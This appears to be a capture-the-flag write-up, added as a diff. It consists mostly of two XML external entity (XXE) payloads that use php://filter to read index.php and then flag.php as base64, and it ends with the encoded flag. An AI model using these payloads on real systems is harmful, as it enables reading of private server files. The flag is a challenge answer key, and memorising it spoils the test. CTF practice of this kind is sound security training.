@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="ISO-8859-1"?> 
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM
+  "php://filter/convert.base64-encode/resource=index.php">
+]>
+<foo>
+  &xxe;
+</foo>
+
+Then decode the base64, you see include 'flag.php' line
+
+So, final payload 
+
+<?xml version="1.0" encoding="ISO-8859-1"?> 
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM
+  "php://filter/convert.base64-encode/resource=flag.php">
+]>
+<foo>
+  &xxe;
+</foo>
+
+Gives base64 encoded content of flag.
+
+PD9waHAKJGZsYWcgPSAnVFdDVEZ7dDFueV9YWEVfc3QxbGxfZXgxc3RzX2V2ZXJ5d2hlcmV9JzsK
